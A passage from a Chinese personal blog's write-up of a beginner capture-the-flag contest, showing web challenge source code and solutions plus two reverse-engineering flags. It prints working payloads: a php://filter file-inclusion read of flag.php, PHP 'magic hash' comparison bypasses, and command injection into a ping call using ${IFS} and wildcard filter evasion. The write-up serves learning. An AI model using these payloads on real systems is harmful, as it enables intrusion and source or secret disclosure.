+</span></span></code></pre></td></tr></table></div></div><p>利用PHP命令<code>eval()</code>可以执行系统命令：</p><p><code>http://ip/web/web3/index.php?c=include$_GET["a"]?>&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>得到<code>PD9waHANCiRmbGFnPsInZWVre3ByZXR0eWdvb2R9ljsNCj8+</code></p><p>base64解码得到&lt;?php$flag="<code>geek{prettygood}</code>";?</p><p>原理：</p><blockquote><p>preg_match()：执行一个正则表达式匹配,过滤掉<code>/flag|system|php|cat|sort|shell|\.| |\'|\|echo|\;|\(/</code>，为了使正则失效，在输入c后加上<code>></code>来闭合PHP代码，再通过PHP伪协议获取flag的base64。</p></blockquote><h3 id=web4>web4</h3><p><img src=/posts/2024/10/30/newbiectf.html/web4.jpg width=789 height=404 srcset="/posts/2024/10/30/newbiectf.html/web4_hu_28a21ebb2ee88106.jpg 480w, /posts/2024/10/30/newbiectf.html/web4_hu_e020bad1166cc08d.jpg 1024w" loading=lazy alt=web4 class=gallery-image data-flex-grow=195 data-flex-basis=468px></p><p>分析可得，需要传入一个值，该值的MD5的MD5还等于该值的MD5。。。</p><p>谷歌一下，找到相关知识点<code>0e漏洞</code>：</p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。from: <a class=link href=https://www.cnblogs.com/m-r-lee/p/13664402.html target=_blank rel=noopener>[md5 collision碰撞]即PHP对0e的缺陷漏洞</a></p></blockquote><p>没找到。。。看官方WP找到值：<code>0e215962017</code></p><p>传入<code>server.php?md5=0e215962017</code></p><p>得到flag:<code>geek{wonderful}</code></p><h3 id=web5>web5</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=c1>// flag in flag.php
+</span></span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;b&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$b</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;b&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$c</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$name</span> <span class=o>=</span> <span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$a</span> <span class=o>!=</span> <span class=nv>$b</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span> <span class=o>==</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$b</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$c</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$c</span> <span class=o>!=</span> <span class=mi>1024</span> <span class=o>&amp;&amp;</span> <span class=nx>intval</span><span class=p>(</span><span class=nv>$c</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1024</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>include</span><span class=p>(</span><span class=nv>$name</span><span class=o>.</span><span class=s1>&#39;.php&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>需要a不为b且他俩md5值一样，c是不为1024但取整后是1024，并且要通过cookie传入一个名字：</p><p>payload:<code>/?a=240610708&amp;b=314826850 POST：c=1024.1a COOKIE=name=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p><code>hackbar</code>拓展传入，得到base64密文<code>PD9waHAgIA0KJGZsYWcgPSAnZ2Vla3tZb3UgYXJlIGdyZWF0fSc7IA0KPz4=</code></p><p>base64解码得到flag：<code>geek{You are great}</code></p><h3 id=web6>web6</h3><p>查看源码找到<code>&lt;!-- visit '/api.php?source' for hint --></code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>sanitize</span><span class=p>(</span><span class=nv>$s</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$s</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;;&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$s</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$s</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$s</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$s</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;source&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;ip&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;No IP Address&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;ip&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=nx>sanitize</span><span class=p>(</span><span class=nv>$ip</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])/&#39;</span><span class=p>,</span> <span class=nv>$ip</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Invalid IP Address&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=s1>&#39;ping -c 4 &#39;</span><span class=o>.</span><span class=nv>$ip</span><span class=o>.</span> <span class=s1>&#39; 2&gt;&amp;1&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>参考<a class=link href=https://blog.csdn.net/m0_74317362/article/details/133947590 target=_blank rel=noopener>0xGame 2023 - CSDN</a></p><p><code>; </code>⽤ <code>%0a</code> 绕过, 空格⽤ <code>${IFS}</code> 绕过, <code>/</code> 以及 <code>flag</code> ⽤ base64 编码绕过:</p><p>post<code>ip=127.0.0.1|ls%09..</code>发现<code>geek</code>目录;</p><p>post<code>ip=127.0.0.1|echo%09"PD9waHAgc3lzdGVtKCdscyAuLi9nZWVrJyk7"|base64%09-d%09>2.php</code>，执行无响应。。。</p><p>然后就解不出来了。。。查看WP:</p><p><code>输入127.0.0.1&&amp;cd${IFS}..&&amp;cd${IFS}geek&&amp;ls切换到geek目录中，发现flag.php</code></p><blockquote><p>因为过滤了flag，所以可以用<code>cat${IFS}fla*</code>来查看其中内容</p></blockquote><p>通配符绕过过滤！学到了！</p><p>得到flag:<code>geek{hello geeker}</code></p><h2 id=reverse>reverse</h2><h3 id=reverse1>reverse1</h3><p><code>IDA Pro</code>反编译在main函数中找到了flag{ajsju19hLDUkdrs8KB6Sl}</p><p><img src=/posts/2024/10/30/newbiectf.html/reverse1.png width=2558 height=1527 srcset="/posts/2024/10/30/newbiectf.html/reverse1_hu_a3929296ee2e95be.png 480w, /posts/2024/10/30/newbiectf.html/reverse1_hu_b9f57e68bdb12bcd.png 1024w" loading=lazy alt=reverse1 class=gallery-image data-flex-grow=167 data-flex-basis=402px></p><h3 id=reverse2>reverse2</h3><p>反编译查找胜利字符，找到 <code>KSLSHDDOWskldrfsKSJ</code></p><p><img src=/posts/2024/10/30/newbiectf.html/reverse2.png width=2558 height=1527 srcset="/posts/2024/10/30/newbiectf.html/reverse2_hu_1fa9813d0dec9b76.png 480w, /posts/2024/10/30/newbiectf.html/reverse2_hu_29f637e3dbcd6422.png 1024w" loading=lazy alt=reverse2 class=gallery-image data-flex-grow=167 data-flex-basis=402px></p><p><code>geek{KSLSHDDOWskldrfsKSJ}</code></p><h2 id=结尾>结尾</h2><p>初知CTF，刚看到题就沉迷进去了，除了吃饭和睡觉满脑子都是题XDDD，有几道题还是上课摸鱼解出来的。最快乐的时候莫过于解出一道题，最痛苦的时候莫过于写WP（（（。</p></section><footer class=article-footer><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/posts/2025/06/11/checksecinstalldiff.html/><div class=article-image><img src=/posts/2025/06/11/checksecinstalldiff.html/cover.0b47bec42efd62326522dcceec7c0c9f_hu_307eb29a98e42e9d.jpg width=250 height=150 loading=lazy alt="Featured image of post checksec横表格不显示架构(arch)问题解决（不同版本安装）" data-key=checksecInstallDiff data-hash="md5-C0e+xC79YjJlItzO7HwMnw=="></div><div class=article-details><h2 class=article-title>checksec横表格不显示架构(arch)问题解决（不同版本安装）</h2></div></a></article><article class=has-image><a href=/posts/2025/05/21/pwnpwnpwn.html/><div class=article-image><img src=/posts/2025/05/21/pwnpwnpwn.html/cover.f3cde723f3a7e5dd369bf97f7e1681d9_hu_10465eb67aba4740.jpg width=250 height=150 loading=lazy alt="Featured image of post 【CTF】pwn学习之路" data-key=pwnpwnpwn data-hash="md5-883nI/On5d02m/l/fhaB2Q=="></div><div class=article-details><h2 class=article-title>【CTF】pwn学习之路</h2></div></a></article><article class=has-image><a href=/posts/2024/11/26/letzreverseit.html/><div class=article-image><img src=/posts/2024/11/26/letzreverseit.html/cover.a51f3d55c8b87ae1eb798ae35be43a02_hu_ea91b000f79a27e4.jpg width=250 height=150 loading=lazy alt="Featured image of post ctf reverse解题+学习" data-key=letzreverseit data-hash="md5-pR89Vci4euHreYrjW+Q6Ag=="></div><div class=article-details><h2 class=article-title>ctf reverse解题+学习</h2></div></a></article><article class=has-image><a href=/posts/2024/11/20/ms08-067review-atk.html/><div class=article-image><img src=/posts/2024/11/20/ms08-067review-atk.html/done.2c98c6fe9545be9398f9dacf51ac2466_hu_729a64e7dfa7860e.png width=250 height=150 loading=lazy alt="Featured image of post 【漏洞】windows漏洞MS08-067复现与攻击" data-key=ms08-067review-atk data-hash="md5-LJjG/pVFvpOY+drPUawkZg=="></div><div class=article-details><h2 class=article-title>【漏洞】windows漏洞MS08-067复现与攻击</h2></div></a></article><article class=has-image><a href=/posts/2024/11/14/web-ctf.html/><div class=article-image><img src=/posts/2024/11/14/web-ctf.html/cover.caaa69c4cd00b265033fd3c5ceb4e8e7_hu_ac0666ffa70324c1.png width=250 height=150 loading=lazy alt="Featured image of post 【归档】ctf web类解密" data-key=web-ctf data-hash="md5-yqppxM0AsmUDP9PFzrTo5w=="></div><div class=article-details><h2 class=article-title>【归档】ctf web类解密</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=wuko233/wuko233.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDAxMzU0ODE=" data-category=Announcements data-category-id=DIC_kwDOF9mVOc4CnNtv data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light_high_contrast data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light_high_contrast":"noborder_dark")}})()</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2026 wuko's blog</section><section class=powerby>本站总访问量<span id=busuanzi_value_site_pv>0</span>次<br><a href="https://icp.gov.moe/?keyword=20220237" target=_blank>萌ICP备20220237号</a><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><br>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
